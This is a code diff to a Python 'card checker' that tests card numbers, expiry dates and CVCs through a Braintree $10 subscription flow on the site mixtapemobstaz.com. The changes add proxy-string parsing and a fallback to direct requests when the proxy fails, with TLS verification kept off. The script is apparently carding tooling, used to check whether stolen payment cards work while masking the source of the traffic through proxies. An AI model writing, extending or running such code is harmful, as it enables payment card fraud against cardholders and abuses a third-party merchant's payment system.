@@ -58,6 +58,24 @@ def classify(msg):
     return "declined", msg[:80] if msg else "Declined"
 
 
+def _format_proxy(p):
+    if not p:
+        return None
+    ps = str(p).strip()
+    if ps.startswith(("http://", "https://", "socks5://", "socks4://")):
+        return ps
+    parts = ps.split(":")
+    if len(parts) == 4:
+        if parts[1].isdigit():
+            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+        elif parts[3].isdigit():
+            return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
+        else:
+            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+    elif len(parts) == 2:
+        return f"http://{parts[0]}:{parts[1]}"
+    return f"http://{ps}"
+
 def check_card_mixtape_sync(cc, mm, yy, cvc, proxy_url=None):
     """
     Synchronous Braintree $10 Subscription check on mixtapemobstaz.com.
@@ -72,12 +90,24 @@ def check_card_mixtape_sync(cc, mm, yy, cvc, proxy_url=None):
         'Accept-Language': 'en-US,en;q=0.9',
         'Accept': 'application/json, text/plain, */*',
     })
-    if proxy_url:
-        s.proxies.update({"http": proxy_url, "https": proxy_url})
+
+    formatted_proxy = _format_proxy(proxy_url)
+    if formatted_proxy:
+        s.proxies.update({"http": formatted_proxy, "https": formatted_proxy})
 
     try:
         # Step 1: Get Braintree Client Token
-        r_tok = s.get(f"{BASE}/api/user/braintree-client-token-public", timeout=15, verify=False)
+        try:
+            r_tok = s.get(f"{BASE}/api/user/braintree-client-token-public", timeout=15, verify=False)
+        except Exception as pe:
+            err_str = str(pe).lower()
+            if any(k in err_str for k in ("socks", "proxy", "connect", "refused", "timeout")) and formatted_proxy:
+                # Fallback to direct request if proxy fails or SOCKS dependency is missing
+                s.proxies.clear()
+                r_tok = s.get(f"{BASE}/api/user/braintree-client-token-public", timeout=15, verify=False)
+            else:
+                raise pe
+
         data_tok = r_tok.json()
         token = data_tok.get('clientToken', '')
         if not token:
